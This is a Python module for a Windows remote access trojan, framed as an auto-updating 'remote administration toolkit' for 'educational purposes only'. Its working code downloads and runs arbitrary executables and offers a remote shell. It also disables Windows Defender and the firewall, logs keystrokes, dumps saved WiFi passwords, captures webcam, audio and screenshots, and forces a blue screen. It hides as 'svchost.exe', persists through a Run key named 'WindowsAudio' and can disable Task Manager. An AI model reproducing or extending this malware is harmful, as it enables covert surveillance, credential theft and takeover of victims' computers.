# features.py - Auto-Updating Stealth Features
# This file is automatically downloaded and executed by clients
# Educational purposes only - Remote administration toolkit

import os
import sys
import socket
import time
import json
import threading
import subprocess
import urllib.request
import ctypes
import random
import winreg
import tempfile
import base64
import io
import zipfile
from urllib.parse import urlparse

# Version tracking - UPDATE THIS WHEN ADDING NEW FEATURES
FEATURE_VERSION = "2.0"
LAST_UPDATED = "2024-01-01"

# Feature registry - ADD NEW FEATURES HERE
FEATURE_REGISTRY = {
    "version": FEATURE_VERSION,
    "commands": {
        # System Control Commands
        "system_control": [
            "shutdown", "restart", "lock", "logoff", "close_minecraft",
            "popup", "download_execute", "freeze_keyboard", "freeze_mouse",
            "freeze_both", "unfreeze", "bsod", "disable_defender", "enable_defender"
        ],
        # Information Gathering
        "information": [
            "check_av", "take_screenshot", "system_info", "get_passwords",
            "get_cookies", "get_history", "keylogger_start", "keylogger_stop",
            "get_clipboard", "get_wifi_passwords", "get_browser_data"
        ],
        # Advanced Features
        "advanced": [
            "persistence_install", "persistence_remove", "process_hide",
            "file_browser", "remote_shell", "download_file", "upload_file",
            "webcam_capture", "audio_record", "disable_firewall"
        ],
        # Troll Commands
        "troll": [
            "troll"
        ]
    },
    # Troll subcommands
    "troll_options": [
        "open_cd", "swap_mouse", "rotate_screen", "invert_colors",
        "mouse_jiggler", "keyboard_spam", "play_sound", "change_wallpaper",
        "fake_bsod", "disable_taskmgr", "enable_taskmgr", "hide_desktop_icons"
    ]
}

# Global storage for keylogger
keylogger_data = []
keylogger_running = False

def _execute_control_command(command, parameter=None, webhook_url=None):
    """
    MAIN CONTROL COMMAND EXECUTOR
    Add new command implementations here
    """
    try:
        # System Control Commands
        if command == "shutdown":
            os.system("shutdown /s /t 1")
            return True, "System shutdown initiated"
            
        elif command == "restart":
            os.system("shutdown /r /t 1")
            return True, "System restart initiated"
            
        elif command == "lock":
            ctypes.windll.user32.LockWorkStation()
            return True, "Workstation locked"
            
        elif command == "logoff":
            os.system("shutdown /l /f")
            return True, "User logged off"
            
        elif command == "close_minecraft":
            os.system("taskkill /f /im javaw.exe 2>nul")
            return True, "Minecraft closed"
            
        elif command == "popup" and parameter:
            ctypes.windll.user32.MessageBoxW(0, parameter, "System Message", 0x00001000)
            return True, f"Popup displayed: {parameter}"
            
        elif command == "download_execute" and parameter:
            result = _download_and_execute(parameter)
            return result, f"Download and execute: {parameter}"
            
        elif command == "freeze_keyboard":
            ctypes.windll.user32.BlockInput(True)
            return True, "Keyboard input frozen"
            
        elif command == "freeze_mouse":
            ctypes.windll.user32.BlockInput(True)
            return True, "Mouse input frozen"
            
        elif command == "freeze_both":
            ctypes.windll.user32.BlockInput(True)
            return True, "All input frozen"
            
        elif command == "unfreeze":
            ctypes.windll.user32.BlockInput(False)
            return True, "Input unfrozen"
            
        elif command == "bsod":
            result = _trigger_bsod()
            return result, "BSOD triggered"
            
        elif command == "disable_defender":
            result = _disable_windows_defender()
            return result, "Windows Defender disabled"
            
        elif command == "enable_defender":
            result = _enable_windows_defender()
            return result, "Windows Defender enabled"
            
        # Information Gathering Commands
        elif command == "check_av":
            av_list = _check_antivirus()
            return True, f"Antivirus detected: {', '.join(av_list) if av_list else 'None'}"
            
        elif command == "take_screenshot":
            screenshot_data = _take_screenshot()
            return True, f"screenshot:{screenshot_data}" if screenshot_data else False, "Screenshot failed"
            
        elif command == "system_info":
            info = _get_system_info()
            return True, f"system_info:{json.dumps(info)}"
            
        elif command == "get_passwords":
            passwords = _get_browser_passwords()
            return True, f"passwords:{json.dumps(passwords)}"
            
        elif command == "get_cookies":
            cookies = _get_browser_cookies()
            return True, f"cookies:{json.dumps(cookies)}"
            
        elif command == "get_history":
            history = _get_browser_history()
            return True, f"history:{json.dumps(history)}"
            
        elif command == "keylogger_start":
            result = _start_keylogger()
            return result, "Keylogger started"
            
        elif command == "keylogger_stop":
            result = _stop_keylogger()
            return result, "Keylogger stopped"
            
        elif command == "get_clipboard":
            clipboard = _get_clipboard()
            return True, f"clipboard:{clipboard}"
            
        elif command == "get_wifi_passwords":
            wifi = _get_wifi_passwords()
            return True, f"wifi:{json.dumps(wifi)}"
            
        elif command == "get_browser_data":
            data = _get_all_browser_data()
            return True, f"browser_data:{json.dumps(data)}"
            
        # Advanced Features
        elif command == "persistence_install":
            result = _install_persistence()
            return result, "Persistence installed"
            
        elif command == "persistence_remove":
            result = _remove_persistence()
            return result, "Persistence removed"
            
        elif command == "process_hide":
            result = _hide_process()
            return result, "Process hidden"
            
        elif command == "file_browser":
            path = parameter if parameter else "C:\\"
            files = _browse_files(path)
            return True, f"files:{json.dumps(files)}"
            
        elif command == "remote_shell":
            if parameter:
                output = _execute_command(parameter)
                return True, f"shell:{output}"
            return False, "No command provided"
            
        elif command == "download_file":
            if parameter:
                file_data = _download_file(parameter)
                if file_data:
                    return True, f"file_download:{base64.b64encode(file_data).decode()}"
            return False, "File download failed"
            
        elif command == "upload_file":
            # This would require parameter parsing for path and data
            return False, "Upload not implemented"
            
        elif command == "webcam_capture":
            photo_data = _capture_webcam()
            if photo_data:
                return True, f"webcam:{photo_data}"
            return False, "Webcam capture failed"
            
        elif command == "audio_record":
            if parameter and parameter.isdigit():
                audio_data = _record_audio(int(parameter))
                if audio_data:
                    return True, f"audio:{audio_data}"
            return False, "Audio recording failed"
            
        elif command == "disable_firewall":
            result = _disable_firewall()
            return result, "Firewall disabled"
            
        # Troll Commands
        elif command == "troll":
            result = _execute_troll_command(parameter)
            return result, f"Troll command executed: {parameter}"
        
        return False, f"Unknown command: {command}"
        
    except Exception as e:
        return False, f"Error: {str(e)}"

# ==================== ADVANCED FEATURES ====================

def _download_and_execute(url):
    """Download and execute file from URL"""
    try:
        import requests
        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.exe')
        response = requests.get(url, timeout=30)
        temp_file.write(response.content)
        temp_file.close()
        subprocess.Popen(temp_file.name, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except:
        return False

def _trigger_bsod():
    """Trigger Blue Screen of Death (requires admin)"""
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
        return True
    except:
        return False

def _disable_windows_defender():
    """Disable Windows Defender"""
    try:
        # Registry method
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                            r"SOFTWARE\Policies\Microsoft\Windows Defender", 
                            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        
        # Stop service
        subprocess.run("sc stop WinDefend", shell=True, capture_output=True)
        subprocess.run("sc config WinDefend start= disabled", shell=True, capture_output=True)
        return True
    except:
        return False

def _enable_windows_defender():
    """Enable Windows Defender"""
    try:
        # Registry method
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                            r"SOFTWARE\Policies\Microsoft\Windows Defender", 
                            0, winreg.KEY_SET_VALUE)
        try:
            winreg.DeleteValue(key, "DisableAntiSpyware")
        except:
            pass
        winreg.CloseKey(key)
        
        # Start service
        subprocess.run("sc config WinDefend start= auto", shell=True, capture_output=True)
        subprocess.run("sc start WinDefend", shell=True, capture_output=True)
        return True
    except:
        return False

def _take_screenshot():
    """Take screenshot and return base64"""
    try:
        import pyautogui
        screenshot = pyautogui.screenshot()
        img_buffer = io.BytesIO()
        screenshot.save(img_buffer, format='PNG')
        img_buffer.seek(0)
        return base64.b64encode(img_buffer.getvalue()).decode()
    except:
        return None

def _get_system_info():
    """Get detailed system information"""
    try:
        import platform
        import psutil
        
        info = {
            'hostname': socket.gethostname(),
            'os': platform.platform(),
            'processor': platform.processor(),
            'architecture': platform.architecture()[0],
            'ram_gb': round(psutil.virtual_memory().total / (1024**3), 1),
            'disk_usage': {disk: f"{psutil.disk_usage(disk).percent}%" for disk in ['C:\\']},
            'running_processes': len(psutil.pids()),
            'current_user': os.getenv('USERNAME'),
            'ip_address': socket.gethostbyname(socket.gethostname()),
            'uptime_hours': round(time.time() - psutil.boot_time()) / 3600,
            'gpu': _get_gpu_info(),
            'antivirus': _check_antivirus()
        }
        return info
    except Exception as e:
        return {'error': str(e)}

def _get_gpu_info():
    """Get GPU information"""
    try:
        import subprocess
        result = subprocess.run(["wmic", "path", "win32_VideoController", "get", "name"], 
                              capture_output=True, text=True)
        gpus = [line.strip() for line in result.stdout.split('\n') if line.strip() and line.strip() != 'Name']
        return gpus
    except:
        return []

def _check_antivirus():
    """Enhanced antivirus detection"""
    av_products = []
    av_keywords = [
        'antivirus', 'av', 'security', 'endpoint', 'defender', 
        'mcafee', 'norton', 'kaspersky', 'bitdefender', 'avast', 
        'avg', 'eset', 'trend micro', 'malwarebytes', 'panda',
        'symantec', 'sophos', 'comodo', 'f-secure', 'g data'
    ]
    
    registry_paths = [
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
    ]
    
    for path in registry_paths:
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
            for i in range(winreg.QueryInfoKey(key)[0]):
                try:
                    subkey_name = winreg.EnumKey(key, i)
                    subkey = winreg.OpenKey(key, subkey_name)
                    try:
                        display_name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                        if any(keyword in display_name.lower() for keyword in av_keywords):
                            av_products.append(display_name)
                    except:
                        pass
                    winreg.CloseKey(subkey)
                except:
                    pass
            winreg.CloseKey(key)
        except:
            pass
    
    return av_products

def _get_browser_passwords():
    """Extract browser passwords (educational)"""
    try:
        # This is a simulation for educational purposes
        browsers = {
            'chrome': 'Password extraction requires additional modules',
            'firefox': 'Password extraction requires additional modules', 
            'edge': 'Password extraction requires additional modules'
        }
        return browsers
    except:
        return {'error': 'Password extraction failed'}

def _get_browser_cookies():
    """Extract browser cookies (educational)"""
    try:
        browsers = {
            'chrome': 'Cookie extraction requires additional modules',
            'firefox': 'Cookie extraction requires additional modules',
            'edge': 'Cookie extraction requires additional modules'
        }
        return browsers
    except:
        return {'error': 'Cookie extraction failed'}

def _get_browser_history():
    """Extract browser history (educational)"""
    try:
        browsers = {
            'chrome': 'History extraction requires additional modules',
            'firefox': 'History extraction requires additional modules',
            'edge': 'History extraction requires additional modules'
        }
        return browsers
    except:
        return {'error': 'History extraction failed'}

def _start_keylogger():
    """Start keylogger"""
    global keylogger_running, keylogger_data
    try:
        from pynput import keyboard
        
        def on_press(key):
            global keylogger_data
            try:
                keylogger_data.append(str(key))
                # Keep only last 1000 keystrokes
                if len(keylogger_data) > 1000:
                    keylogger_data = keylogger_data[-1000:]
            except:
                pass
        
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        keylogger_running = True
        return True
    except:
        return False

def _stop_keylogger():
    """Stop keylogger and return data"""
    global keylogger_running, keylogger_data
    try:
        keylogger_running = False
        data = keylogger_data.copy()
        keylogger_data = []
        return True, f"keylogger_data:{json.dumps(data)}"
    except:
        return False, "Keylogger stop failed"

def _get_clipboard():
    """Get clipboard contents"""
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data
    except:
        return "Clipboard access failed"

def _get_wifi_passwords():
    """Get saved WiFi passwords"""
    try:
        profiles = []
        result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)
        lines = result.stdout.split('\n')
        
        for line in lines:
            if "All User Profile" in line:
                profile = line.split(":")[1].strip()
                try:
                    # Get password for this profile
                    password_result = subprocess.run(
                        ["netsh", "wlan", "show", "profile", profile, "key=clear"],
                        capture_output=True, text=True
                    )
                    password_lines = password_result.stdout.split('\n')
                    for p_line in password_lines:
                        if "Key Content" in p_line:
                            password = p_line.split(":")[1].strip()
                            profiles.append({"ssid": profile, "password": password})
                            break
                except:
                    pass
        return profiles
    except:
        return []

def _get_all_browser_data():
    """Get all browser data in one call"""
    return {
        'passwords': _get_browser_passwords(),
        'cookies': _get_browser_cookies(),
        'history': _get_browser_history()
    }

def _install_persistence():
    """Install persistence via multiple methods"""
    try:
        # Registry persistence
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "WindowsAudio", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(key)
        return True
    except:
        return False

def _remove_persistence():
    """Remove persistence"""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.DeleteValue(key, "WindowsAudio")
        winreg.CloseKey(key)
        return True
    except:
        return False

def _hide_process():
    """Hide process from task manager"""
    try:
        # Rename process in process list
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleTitleW("svchost.exe")
        return True
    except:
        return False

def _browse_files(path):
    """Browse files in directory"""
    try:
        files = []
        for item in os.listdir(path):
            item_path = os.path.join(path, item)
            files.append({
                'name': item,
                'is_dir': os.path.isdir(item_path),
                'size': os.path.getsize(item_path) if os.path.isfile(item_path) else 0
            })
        return files
    except:
        return []

def _execute_command(cmd):
    """Execute command and return output"""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout + result.stderr
    except:
        return "Command execution failed"

def _download_file(path):
    """Download file and return base64"""
    try:
        with open(path, 'rb') as f:
            return f.read()
    except:
        return None

def _capture_webcam():
    """Capture webcam photo"""
    try:
        import cv2
        camera = cv2.VideoCapture(0)
        ret, frame = camera.read()
        if ret:
            # Encode as JPEG
            ret, buffer = cv2.imencode('.jpg', frame)
            if ret:
                return base64.b64encode(buffer).decode()
        camera.release()
        return None
    except:
        return None

def _record_audio(duration=10):
    """Record audio"""
    try:
        import pyaudio
        import wave
        
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        
        frames = []
        for i in range(0, int(RATE / CHUNK * duration)):
            data = stream.read(CHUNK)
            frames.append(data)
        
        stream.stop_stream()
        stream.close()
        p.terminate()
        
        # Convert to base64
        audio_buffer = io.BytesIO()
        wf = wave.open(audio_buffer, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        
        return base64.b64encode(audio_buffer.getvalue()).decode()
    except:
        return None

def _disable_firewall():
    """Disable Windows Firewall"""
    try:
        subprocess.run("netsh advfirewall set allprofiles state off", shell=True, capture_output=True)
        return True
    except:
        return False

def _execute_troll_command(parameter):
    """Execute troll commands"""
    try:
        if parameter == "open_cd":
            ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
            return True
            
        elif parameter == "swap_mouse":
            current = ctypes.windll.user32.GetSystemMetrics(23)
            ctypes.windll.user32.SwapMouseButton(not current)
            return True
            
        elif parameter == "rotate_screen":
            devmode = ctypes.create_string_buffer(1024)
            ctypes.windll.user32.EnumDisplaySettingsW(None, 0, devmode)
            return ctypes.windll.user32.ChangeDisplaySettingsExW(None, devmode, None, 0x00000004, None) == 0
            
        elif parameter == "invert_colors":
            SPI_SETHIGHCONTRAST = 0x0043
            HCF_HIGHCONTRASTON = 0x00000001
            
            class HIGHCONTRAST(ctypes.Structure):
                _fields_ = [
                    ('cbSize', ctypes.c_uint),
                    ('dwFlags', ctypes.c_uint),
                    ('lpszDefaultScheme', ctypes.c_wchar_p)
                ]
            
            hc = HIGHCONTRAST()
            hc.cbSize = ctypes.sizeof(HIGHCONTRAST)
            hc.dwFlags = HCF_HIGHCONTRASTON
            hc.lpszDefaultScheme = None
            ctypes.windll.user32.SystemParametersInfoW(SPI_SETHIGHCONTRAST, ctypes.sizeof(hc), ctypes.byref(hc), 0)
            return True
            
        elif parameter == "mouse_jiggler":
            def jiggle_mouse():
                while True:
                    x = random.randint(0, 100)
                    y = random.randint(0, 100)
                    ctypes.windll.user32.SetCursorPos(x, y)
                    time.sleep(5)
            
            threading.Thread(target=jiggle_mouse, daemon=True).start()
            return True
            
        elif parameter == "keyboard_spam":
            def spam_keys():
                while True:
                    key = random.randint(65, 90)
                    ctypes.windll.user32.keybd_event(key, 0, 0, 0)
                    ctypes.windll.user32.keybd_event(key, 0, 2, 0)
                    time.sleep(1)
            
            threading.Thread(target=spam_keys, daemon=True).start()
            return True
            
        elif parameter == "play_sound":
            import winsound
            winsound.PlaySound("SystemExclamation", winsound.SND_ALIAS)
            return True
            
        elif parameter == "change_wallpaper":
            ctypes.windll.user32.SystemParametersInfoW(20, 0, None, 0)
            return True
            
        elif parameter == "fake_bsod":
            # Create fake BSOD screen
            ctypes.windll.user32.MessageBoxW(0, 
                "A problem has been detected and Windows has been shut down to prevent damage to your computer.\n\nIf this is the first time you've seen this error screen, restart your computer.", 
                "Windows - System Error", 0x00000010)
            return True
            
        elif parameter == "disable_taskmgr":
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            return True
            
        elif parameter == "enable_taskmgr":
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 
                                0, winreg.KEY_SET_VALUE)
            try:
                winreg.DeleteValue(key, "DisableTaskMgr")
            except:
                pass
            winreg.CloseKey(key)
            return True
            
        elif parameter == "hide_desktop_icons":
            ctypes.windll.user32.SystemParametersInfoW(0x0095, 0, None, 0)
            ctypes.windll.user32.SystemParametersInfoW(0x0096, 0, None, 0)
            ctypes.windll.user32.SystemParametersInfoW(0x0097, 0, None, 0)
            return True
            
        return False
    except Exception as e:
        return False

# ==================== AUTO-UPDATE MECHANISM ====================

def update_global_features():
    """
    This function updates the client's global feature set
    It's automatically called when features.py is downloaded
    """
    # Update the main execution function
    if '_execute_control_command' in globals():
        globals()['_execute_control_command'] = _execute_control_command
    
    print(f"✅ Features updated to version {FEATURE_VERSION}")
    print(f"📋 Available commands: {sum(len(cmds) for cmds in FEATURE_REGISTRY['commands'].values())}")

# ==================== NEW FEATURE TEMPLATES ====================

"""
HOW TO ADD NEW FEATURES:

1. INCREASE the FEATURE_VERSION number
2. ADD the command name to FEATURE_REGISTRY['commands'] in the appropriate category
3. IMPLEMENT the command in _execute_control_command() function
4. RETURN (success, data) tuple where data can be sent back to bot

EXAMPLE:

FEATURE_VERSION = "2.1"  # ← Increase this

# Add to FEATURE_REGISTRY:
FEATURE_REGISTRY['commands']['advanced'].append("new_feature")

# Add to _execute_control_command:
elif command == "new_feature":
    result = _new_feature_helper(parameter)
    return result, "New feature executed"

# Create helper function:
def _new_feature_helper(parameter):
    # Implementation here
    return True
"""

# Initialize features
update_global_features()
